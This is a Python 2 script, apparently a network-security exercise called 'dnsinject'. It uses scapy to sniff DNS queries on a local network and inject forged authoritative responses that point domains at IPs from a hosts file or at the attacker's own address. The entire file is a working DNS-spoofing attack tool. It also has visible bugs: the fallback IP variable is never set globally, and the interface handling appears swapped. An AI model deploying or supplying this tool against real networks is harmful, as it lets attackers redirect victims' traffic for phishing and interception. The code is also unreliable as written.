import sys
import os
import argparse
import socket
import scapy
from scapy.all import *
import netifaces as ni
import time

hosts = {}
mip = ''
soc = None

# parse argumens
def get_args():
	parser = argparse.ArgumentParser(add_help=False);
	# interface
	parser.add_argument('-i', metavar='eth0');
	# hosts
	parser.add_argument('-h', metavar='192.168.10.1');
	# expression
	parser.add_argument('expression', nargs='*', action='store');
	arg = parser.parse_args();
	exp = 'udp port 53'

	if (arg.expression):
		exp = exp + ' and ' + ' '.join(arg.expression)

	# Parse host file and populate all hosts in a list with corresponding IP addresses
	if (arg.h) :
		print "Hosts : ",
		with open(arg.h) as fp:
			for line in fp:
				line = line.split();
				if len(line) != 2:
					continue;
				hosts[line[1].strip()] = line[0].strip();
		print hosts

	return arg.i, arg.h, exp;

# DNS packet 
def dns_packet(packet):

	global hosts, mip, soc

	# check if DNSRR record is not present and DNSQR is present
	if ((UDP in packet) and (packet.dport == 53) and
		(DNSRR not in packet) and (DNSQR in packet)):

		print "Query", packet[DNSQR].qname[:-1]

		# check for entry in hosts file
		if (packet[DNSQR].qname[:-1] in hosts):
			spf_ip = hosts[packet[DNSQR].qname[:-1]];
		# if entry not in hosts file, spoof with my ip
		elif (len(hosts) == 0):
			spf_ip = mip;
		else:
			print "Will Not Inject"
			return

		print "\nSpoofed IP is", spf_ip;

		# create a spoof DNS response packet
		# Interchage src and dst IP
		# Interchange src and dst UDP ports
		# Over DNS entries for id, qd, aa, qr and an
		# rdata is populated with spoofed IP
		spf_pkt = IP(dst=packet[IP].src,
				src=packet[IP].dst)/\
			UDP(dport=packet[UDP].sport,
				sport=packet[UDP].dport)/\
			DNS(id=packet[DNS].id,
				qd=DNSQR(qname=packet[DNSQR].qname),
				aa = 1,
				qr = 1,
				an=DNSRR(rrname=packet[DNS].qd.qname, rdata=spf_ip));

		# send the packet
		soc.sendto(str(spf_pkt), (packet[IP].src, packet[UDP].sport));
		print "Successfully Injected";


def main():
	global soc;
	# Get all the arguments parsed
	[i, h, exp] = get_args();

	# Open a socket
	soc = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW);
	try:
		if (i) :
			# sniff packets on interface if one specified by user
			mip = ni.ifaddresses(i)[2][0]['addr'];
			sniff(filter = exp, iface = conf.iface, prn = dns_packet);
		else :
			# sniff on default interface
			mip = ni.ifaddresses(conf.iface)[2][0]['addr'];
			sniff(filter = exp, iface = i, prn = dns_packet);
	except:
		print "Input Incorrect";
		print "Correct Format dnsinject [-i interface] [-h hostname] expression";

# Ivoke main function
main();
